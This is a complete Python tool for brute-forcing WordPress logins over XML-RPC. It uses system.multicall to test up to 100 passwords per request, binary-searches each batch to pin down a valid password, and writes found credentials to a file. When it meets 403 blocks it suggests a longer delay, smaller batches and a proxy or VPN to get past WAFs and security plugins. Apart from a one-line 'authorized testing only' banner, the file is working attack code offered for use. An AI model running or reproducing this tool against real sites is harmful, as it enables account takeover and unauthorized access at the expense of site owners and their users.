#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
caosdev-xmlrpc-brute v1.0.0 - WordPress XML-RPC Brute Force Tool
Author: caosdev | github: https://github.com/henriqqw
Usage: python3 caosdev-xmlrpc-brute.py -u admin -w wordlist.txt https://site.com/xmlrpc.php
"""

import requests
import argparse
import sys
import time
import signal
from urllib.parse import urlparse
from typing import List, Optional
from datetime import datetime

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'

class Emoji:
    ROCKET = "🚀"
    TARGET = "🎯"
    USER = "👤"
    BOOK = "📚"
    GEAR = "⚙️"
    SEARCH = "🔍"
    CHECK = "✓"
    CROSS = "✗"
    WARNING = "⚠️"
    LOCK = "🔒"
    KEY = "🔑"
    TROPHY = "🏆"
    CHART = "📊"
    CLOCK = "⏱️"
    SHIELD = "🛡️"
    SKULL = "☠️"
    STOP = "🛑"
    PARTY = "🎉"
    INFO = "ℹ️"
    SAVE = "💾"

stats = {
    'tested': 0,
    'blocks_403': 0,
    'blocks_429': 0,
    'errors': 0,
    'start_time': 0,
    'requests': 0
}

def signal_handler(sig, frame):
    """Handler for Ctrl+C - shows statistics before exiting"""
    print(f"\n\n{Colors.YELLOW}┌{'─' * 58}┐{Colors.END}")
    print(f"{Colors.YELLOW}│{Colors.END} {Colors.BOLD}⚠️  INTERRUPTED BY USER{Colors.END}{' ' * 33}{Colors.YELLOW}│{Colors.END}")
    print(f"{Colors.YELLOW}└{'─' * 58}┘{Colors.END}")
    print_statistics()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def escape_xml(text: str) -> str:
    """Escapes XML special characters"""
    return (text
        .replace('&', '&amp;')
        .replace('<', '&lt;')
        .replace('>', '&gt;')
        .replace('"', '&quot;')
        .replace("'", '&apos;'))

def build_multicall_payload(username: str, passwords: List[str]) -> str:
    """Builds optimized XML payload for system.multicall"""
    safe_user = escape_xml(username)
    
    calls = []
    for pwd in passwords:
        safe_pwd = escape_xml(pwd)
        call = (
            '<value><struct>'
            '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
            '<member><name>params</name><value><array><data>'
            f'<value><string>{safe_user}</string></value>'
            f'<value><string>{safe_pwd}</string></value>'
            '</data></array></value></member>'
            '</struct></value>'
        )
        calls.append(call)
    
    payload = (
        '<?xml version="1.0"?>'
        '<methodCall>'
        '<methodName>system.multicall</methodName>'
        '<params><param><value><array><data>'
        + ''.join(calls) +
        '</data></array></value></param></params>'
        '</methodCall>'
    )
    
    return payload

def build_single_payload(username: str, password: str) -> str:
    """Builds payload for individual test"""
    safe_user = escape_xml(username)
    safe_pwd = escape_xml(password)
    
    return (
        '<?xml version="1.0"?>'
        '<methodCall>'
        '<methodName>wp.getUsersBlogs</methodName>'
        '<params>'
        f'<param><value><string>{safe_user}</string></value></param>'
        f'<param><value><string>{safe_pwd}</string></value></param>'
        '</params>'
        '</methodCall>'
    )

def is_success(response_text: str) -> bool:
    """
    Checks if there's a successful login in the response.
    Valid login returns <params> with blog data.
    Invalid login returns <fault> with faultCode.
    """
    if '<fault>' in response_text or 'faultCode' in response_text:
        return False
    
    if '<params>' in response_text:
        indicators = [
            '<name>blogid</name>',
            '<name>url</name>',
            '<name>isAdmin</name>',
            '<name>blogName</name>'
        ]
        count = sum(1 for ind in indicators if ind in response_text)
        return count >= 2
    
    return False

def find_valid_password_binary(url: str, username: str, batch: List[str], 
                                headers: dict, timeout: int) -> Optional[str]:
    """Binary search to find valid password"""
    if len(batch) == 0:
        return None
    
    if len(batch) == 1:
        payload = build_single_payload(username, batch[0])
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=timeout)
            if is_success(response.text):
                return batch[0]
        except:
            pass
        return None
    
    mid = len(batch) // 2
    first_half = batch[:mid]
    second_half = batch[mid:]
    
    payload = build_multicall_payload(username, first_half)
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=timeout)
        
        if is_success(response.text):
            return find_valid_password_binary(url, username, first_half, headers, timeout)
        else:
            return find_valid_password_binary(url, username, second_half, headers, timeout)
    except:
        return find_valid_password_linear(url, username, batch, headers, timeout)

def find_valid_password_linear(url: str, username: str, batch: List[str], 
                                headers: dict, timeout: int) -> Optional[str]:
    """Fallback: linear search"""
    for pwd in batch:
        payload = build_single_payload(username, pwd)
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=timeout)
            if is_success(response.text):
                return pwd
        except:
            continue
    return None

def load_wordlist(path: str) -> List[str]:
    """Loads wordlist from file"""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        if not passwords:
            log_error("Wordlist is empty")
            sys.exit(1)
        
        return passwords
    except FileNotFoundError:
        log_error(f"File not found: {path}")
        sys.exit(1)
    except Exception as e:
        log_error(f"Error reading wordlist: {e}")
        sys.exit(1)

def test_xmlrpc_availability(url: str, timeout: int) -> bool:
    """Tests if XML-RPC is available"""
    payload = (
        '<?xml version="1.0"?>'
        '<methodCall>'
        '<methodName>system.listMethods</methodName>'
        '<params></params>'
        '</methodCall>'
    )
    
    headers = {"Content-Type": "application/xml"}
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=timeout)
        if response.status_code == 200 and 'methodResponse' in response.text:
            return True
    except:
        pass
    
    return False

def print_banner():
    """Prints ASCII art banner"""
    banner = f"""{Colors.CYAN}
---------------------------------------------------------------------
                                         █████                     
                                        ░░███                      
  ██████   ██████    ██████   █████   ███████   ██████  █████ █████
 ███░░███ ░░░░░███  ███░░███ ███░░   ███░░███  ███░░███░░███ ░░███ 
░███ ░░░   ███████ ░███ ░███░░█████ ░███ ░███ ░███████  ░███  ░███ 
░███  ███ ███░░███ ░███ ░███ ░░░░███░███ ░███ ░███░░░   ░░███ ███  
░░██████ ░░████████░░██████  ██████ ░░████████░░██████   ░░█████   
 ░░░░░░   ░░░░░░░░  ░░░░░░  ░░░░░░   ░░░░░░░░  ░░░░░░     ░░░░░    
                                                                   
            Python Bruteforce XMLRPC - by caosdev
                       version 1.0.0
---------------------------------------------------------------------{Colors.END}
{Colors.GREEN}XML-RPC bruteforce on steroids{Colors.END}
{Colors.RED}⚠️  WARNING: AUTHORIZED TESTING ONLY ⚠️{Colors.END}
"""
    print(banner)

def log_info(message: str, emoji: str = Emoji.INFO):
    """Info log"""
    print(f"{Colors.BLUE}[{emoji}] {message}{Colors.END}")

def log_success(message: str, emoji: str = Emoji.CHECK):
    """Success log"""
    print(f"{Colors.GREEN}[{emoji}] {message}{Colors.END}")

def log_warning(message: str, emoji: str = Emoji.WARNING):
    """Warning log"""
    print(f"{Colors.YELLOW}[{emoji}] {message}{Colors.END}")

def log_error(message: str, emoji: str = Emoji.CROSS):
    """Error log"""
    print(f"{Colors.RED}[{emoji}] {message}{Colors.END}")

def log_critical(message: str):
    """Critical log"""
    print(f"\n{Colors.BG_RED}{Colors.BOLD} CRITICAL {Colors.END} {Colors.RED}{Colors.BOLD}{message}{Colors.END}\n")

def log_found(username: str, password: str):
    """Found credential log"""
    print(f"\n{Colors.GREEN}┌{'─' * 58}┐{Colors.END}")
    print(f"{Colors.GREEN}│{Colors.END} {Colors.BG_GREEN}{Colors.BOLD} AUTHENTICATION SUCCESSFUL {Colors.END}{' ' * 31}{Colors.GREEN}│{Colors.END}")
    print(f"{Colors.GREEN}├{'─' * 58}┤{Colors.END}")
    print(f"{Colors.GREEN}│{Colors.END} {Emoji.USER} User:     {Colors.BOLD}{username}{Colors.END}{' ' * (44 - len(username))}{Colors.GREEN}│{Colors.END}")
    print(f"{Colors.GREEN}│{Colors.END} {Emoji.KEY} Password: {Colors.BOLD}{password}{Colors.END}{' ' * (44 - len(password))}{Colors.GREEN}│{Colors.END}")
    print(f"{Colors.GREEN}└{'─' * 58}┘{Colors.END}\n")

def print_progress_bar(current: int, total: int, width: int = 40):
    """Progress bar"""
    percent = (current / total) * 100
    filled = int(width * current // total)
    bar = '█' * filled + '░' * (width - filled)
    return f"[{bar}] {percent:.1f}%"

def print_statistics():
    """Attack statistics"""
    elapsed = time.time() - stats['start_time']
    rate = stats['tested'] / elapsed if elapsed > 0 else 0
    
    print(f"\n{Colors.CYAN}┌{'─' * 58}┐{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} {Emoji.CHART} {Colors.BOLD}ATTACK STATISTICS{Colors.END}{' ' * 38}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}├{'─' * 58}┤{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} Tested passwords: {Colors.BOLD}{stats['tested']:>8,}{Colors.END}{' ' * 30}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} Requests:         {Colors.BOLD}{stats['requests']:>8,}{Colors.END}{' ' * 30}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} Elapsed time:     {Colors.BOLD}{elapsed:>8.2f}s{Colors.END} ({elapsed/60:.1f} min){' ' * 18}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} Test rate:        {Colors.BOLD}{rate:>8.1f}{Colors.END} passwords/sec{' ' * 16}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}├{'─' * 58}┤{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} {Colors.RED}403 Blocks:{Colors.END}       {Colors.BOLD}{stats['blocks_403']:>8}{Colors.END}{' ' * 30}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} {Colors.YELLOW}429 Blocks:{Colors.END}       {Colors.BOLD}{stats['blocks_429']:>8}{Colors.END}{' ' * 30}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} Network errors:   {Colors.BOLD}{stats['errors']:>8}{Colors.END}{' ' * 30}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}└{'─' * 58}┘{Colors.END}\n")

def print_batch_header(batch_num: int, total_batches: int, tested: int, total: int):
    """Prints batch header"""
    progress_bar = print_progress_bar(tested, total)
    print(f"\n{Colors.CYAN}┌{'─' * 58}┐{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} {Emoji.SKULL} Batch {batch_num:>3}/{total_batches:<3} │ Tested: {tested:>6,}/{total:<6,}{' ' * 21}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}│{Colors.END} {progress_bar}{' ' * 16}{Colors.CYAN}│{Colors.END}")
    print(f"{Colors.CYAN}└{'─' * 58}┘{Colors.END}")

def main():
    parser = argparse.ArgumentParser(
        description="WordPress XML-RPC Brute Force Tool by caosdev",
        epilog=f"Example: python3 %(prog)s -u admin -w passwords.txt https://site.com/xmlrpc.php",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('url', help='xmlrpc.php URL')
    parser.add_argument('-u', '--username', required=True, help='Target username')
    parser.add_argument('-w', '--wordlist', required=True, help='Wordlist path')
    parser.add_argument('-b', '--batch-size', type=int, default=50, 
                        help='Passwords per request (default: 50, max: 100)')
    parser.add_argument('-d', '--delay', type=float, default=0.5, 
                        help='Delay between requests in seconds (default: 0.5)')
    parser.add_argument('-t', '--timeout', type=int, default=15, 
                        help='Request timeout in seconds (default: 15)')
    parser.add_argument('--stop-on-success', action='store_true', 
                        help='Stop when valid credential is found')
    parser.add_argument('--no-banner', action='store_true', 
                        help='Do not display initial banner')
    parser.add_argument('-o', '--output', default='credentials.txt',
                        help='Output file (default: credentials.txt)')
    parser.add_argument('--verbose', action='store_true',
                        help='Verbose mode - more details in logs')

    args = parser.parse_args()

    # Banner
    if not args.no_banner:
        print_banner()

    # Validations
    parsed = urlparse(args.url)
    if not parsed.scheme or not parsed.netloc:
        log_error(f"Invalid URL: {args.url}")
        sys.exit(1)
    
    if args.batch_size > 100:
        log_warning("Batch-size too high, limiting to 100")
        args.batch_size = 100

    # Initial information
    print(f"\n{Colors.BOLD}{'═' * 60}{Colors.END}")
    log_info(f"Starting brute-force at {datetime.now().strftime('%H:%M:%S')}", Emoji.ROCKET)
    print(f"{Colors.BOLD}{'═' * 60}{Colors.END}\n")
    
    log_info(f"Target:   {Colors.BOLD}{args.url}{Colors.END}", Emoji.TARGET)
    log_info(f"User:     {Colors.BOLD}{args.username}{Colors.END}", Emoji.USER)
    log_info(f"Wordlist: {Colors.BOLD}{args.wordlist}{Colors.END}", Emoji.BOOK)
    log_info(f"Config:   batch={args.batch_size} | delay={args.delay}s | timeout={args.timeout}s", Emoji.GEAR)

    # Availability test
    print(f"\n{Colors.YELLOW}{'─' * 60}{Colors.END}")
    log_info("Testing XML-RPC availability...", Emoji.SEARCH)
    
    if not test_xmlrpc_availability(args.url, args.timeout):
        log_error("XML-RPC is not accessible or is blocked", Emoji.SHIELD)
        print(f"\n{Colors.YELLOW}Possible causes:{Colors.END}")
        print(f"  {Emoji.LOCK} XML-RPC was disabled via plugin or .htaccess")
        print(f"  {Emoji.SHIELD} WAF is blocking requests")
        print(f"  {Emoji.CROSS} Incorrect URL")
        print(f"  {Emoji.SKULL} Server offline")
        sys.exit(1)
    
    log_success("XML-RPC is accessible and responding!", Emoji.CHECK)

    # Load wordlist
    passwords = load_wordlist(args.wordlist)
    total = len(passwords)
    log_success(f"Loaded {Colors.BOLD}{total:,}{Colors.END} passwords from wordlist", Emoji.BOOK)
    print(f"{Colors.YELLOW}{'─' * 60}{Colors.END}")

    # Request settings
    headers = {
        "Content-Type": "application/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

    # Initialize statistics
    stats['start_time'] = time.time()
    found_credentials = []
    
    MAX_BLOCKS_403 = 5
    MAX_BLOCKS_429 = 3

    # Main loop
    total_batches = (total + args.batch_size - 1) // args.batch_size
    
    for i in range(0, total, args.batch_size):
        batch = passwords[i:i + args.batch_size]
        stats['tested'] += len(batch)
        stats['requests'] += 1
        
        batch_num = (i // args.batch_size) + 1
        
        print_batch_header(batch_num, total_batches, stats['tested'], total)

        payload = build_multicall_payload(args.username, batch)
        
        try:
            response = requests.post(
                args.url,
                data=payload,
                headers=headers,
                timeout=args.timeout
            )

            if args.verbose:
                print(f"  {Emoji.INFO} Status: {response.status_code} | Size: {len(response.content):,} bytes")

            # Analyze response
            if response.status_code == 200:
                if is_success(response.text):
                    log_found_in_batch = True
                    log_info("Valid credential detected in batch!", Emoji.KEY)
                    log_info("Identifying specific password...", Emoji.SEARCH)
                    
                    found_pwd = find_valid_password_binary(
                        args.url, args.username, batch, headers, args.timeout
                    )
                    
                    if found_pwd:
                        log_found(args.username, found_pwd)
                        
                        credential = f"{args.username}:{found_pwd}"
                        
                        # Save credential
                        try:
                            with open(args.output, "a") as f:
                                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                f.write(f"[{timestamp}] {args.url} | {credential}\n")
                            log_success(f"Saved to: {args.output}", Emoji.SAVE)
                        except Exception as e:
                            log_error(f"Error saving: {e}", Emoji.WARNING)
                        
                        found_credentials.append(credential)
                        
                        if args.stop_on_success:
                            log_warning("Stopping (--stop-on-success)", Emoji.STOP)
                            print_statistics()
                            sys.exit(0)
                else:
                    if args.verbose:
                        print(f"  {Emoji.CROSS} No valid password in this batch")
            
            elif response.status_code == 403:
                stats['blocks_403'] += 1
                log_warning(f"403 Forbidden - block detected ({stats['blocks_403']}/{MAX_BLOCKS_403})", Emoji.SHIELD)
                
                if stats['blocks_403'] >= MAX_BLOCKS_403:
                    log_critical("MULTIPLE 403 BLOCKS DETECTED!")
                    print(f"{Colors.YELLOW}Possible causes:{Colors.END}")
                    print(f"  {Emoji.SHIELD} Active WAF (Cloudflare, Sucuri, Wordfence)")
                    print(f"  {Emoji.LOCK} Security plugin blocking IP")
                    print(f"  {Emoji.CROSS} XML-RPC was disabled")
                    print(f"\n{Colors.YELLOW}Suggestions:{Colors.END}")
                    print(f"  • Increase --delay (current: {args.delay}s)")
                    print(f"  • Reduce --batch-size (current: {args.batch_size})")
                    print(f"  • Use proxy/VPN")
                    print_statistics()
                    sys.exit(1)
            
            elif response.status_code == 429:
                stats['blocks_429'] += 1
                log_warning(f"429 Too Many Requests ({stats['blocks_429']}/{MAX_BLOCKS_429})", Emoji.CLOCK)
                
                if stats['blocks_429'] >= MAX_BLOCKS_429:
                    log_warning("Rate limiting detected - pausing 30s", Emoji.CLOCK)
                    time.sleep(30)
                    stats['blocks_429'] = 0
            
            elif response.status_code >= 500:
                log_error(f"Server error: {response.status_code}", Emoji.SKULL)

        except requests.exceptions.Timeout:
            stats['errors'] += 1
            log_error(f"Timeout - server took more than {args.timeout}s", Emoji.CLOCK)
        
        except requests.exceptions.ConnectionError:
            stats['errors'] += 1
            log_error("Connection error - server may be offline", Emoji.SKULL)
        
        except requests.exceptions.RequestException as e:
            stats['errors'] += 1
            if args.verbose:
                log_error(f"Error: {str(e)[:50]}", Emoji.WARNING)

        # Delay between requests
        if i + args.batch_size < total:
            time.sleep(args.delay)

    # End
    print(f"\n{Colors.GREEN}{'═' * 60}{Colors.END}")
    print(f"{Colors.GREEN}{Colors.BOLD}  ✓ BRUTE-FORCE COMPLETED{Colors.END}")
    print(f"{Colors.GREEN}{'═' * 60}{Colors.END}\n")
    
    if found_credentials:
        log_success(f"{len(found_credentials)} credential(s) found:", Emoji.TROPHY)
        for cred in found_credentials:
            print(f"  {Emoji.KEY} {Colors.BOLD}{cred}{Colors.END}")
        print()
    else:
        log_warning("No valid credentials found in wordlist", Emoji.INFO)
    
    print_statistics()

if __name__ == "__main__":
    main()